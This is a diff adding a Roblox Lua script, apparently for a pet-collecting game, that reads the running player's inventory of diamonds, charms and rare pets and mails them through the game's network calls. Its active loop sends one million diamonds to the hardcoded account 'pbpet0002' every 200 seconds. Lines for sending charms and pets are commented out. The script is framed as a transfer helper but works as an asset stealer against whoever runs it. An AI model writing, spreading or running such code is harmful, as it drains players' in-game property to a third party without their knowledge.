@@ -1,0 +1,96 @@
+local Library = require(game:GetService("ReplicatedStorage").Library)
+local SavedData;
+repeat wait()
+    pcall(function()
+        SavedData = Library.Save.Get();
+    end);
+until type(SavedData) == "table";
+
+local Network = Library.Network
+local Functions = Library.Functions
+
+function getCharms()
+    local Charms = {}
+    for i, v in pairs(Functions.DeepCopy(SavedData["Inventory"]["Charm"])) do
+        Charms[v["id"]] = v
+        Charms[v["id"]]["uid"] = i
+    end
+    return Charms
+end
+
+function getDiamonds()
+    for i, v in pairs(SavedData["Inventory"]["Currency"]) do
+        if v["id"] == "Diamonds" then
+            return i, tonumber(v["_am"])
+        end
+    end
+    return false
+end
+
+
+function getHuges()
+    local Huges = {}
+    for i, v in pairs(Functions.DeepCopy(SavedData["Inventory"]["Pet"])) do
+        if not v._uq then continue end
+        if not Huges[v["id"]] then Huges[v["id"]] = {} end
+        Huges[v["id"]][i] = v
+    end
+    return Huges
+end
+
+function SendDiamonds(options)
+
+    local user = options.user;
+    local amount = options.amount;
+
+    local ID, Amount = getDiamonds()
+    if ID and Amount then
+        if amount == "All" and Amount > 10000 then
+            return Network.Invoke("Mailbox: Send", user, ("Diamonds (%s)"):format(Functions.NumberShorten(Amount - 10000)), "Currency", ID, Amount - 10000)
+        elseif Amount >= amount + 10000 then
+            return Network.Invoke("Mailbox: Send", user, ("Diamonds (%s)"):format(Functions.NumberShorten(amount)), "Currency", ID, amount)
+        else
+            warn("Not Enough Diamonds")
+        end
+    end
+end
+
+function SendCharms(options)
+
+    local user = options.user;
+    local charm = options.charm;
+
+    local ID, Amount = getDiamonds()
+    local Charms = getCharms()
+
+    if Charms[charm] and Amount >= 10000 then
+        local Charm = Charms[charm]
+        return Network.Invoke("Mailbox: Send", user, ("%s Charm"):format(charm), "Charm", Charm.uid, Charm._am or 1)
+    end
+end
+
+function SendHuge(options)
+
+    local user = options.user;
+    local huge = options.huge;
+
+    local ID, Amount = getDiamonds()
+
+    local Huges = getHuges()
+
+    if Huges[huge] and Amount >= 10000 then
+        for i,v in pairs(Huges[huge]) do
+            return Network.Invoke("Mailbox: Send", user, ("%s"):format(huge), "Pet", i, 1)
+        end
+    end
+end
+
+-- "user" is username of who u want to send
+-- if u want to send all just change amount to "All"
+spawn(function()
+    while true do task.wait(200)
+        SendDiamonds({ user = "pbpet0002" , amount = 1000000 })
+        -- SendCharms({ user = "pbpet0002" , charm = "charm" })
+        -- SendHuge({ user = "pbpet0002" , huge = "Huge Poseidon Corgi" })
+    end
+end)
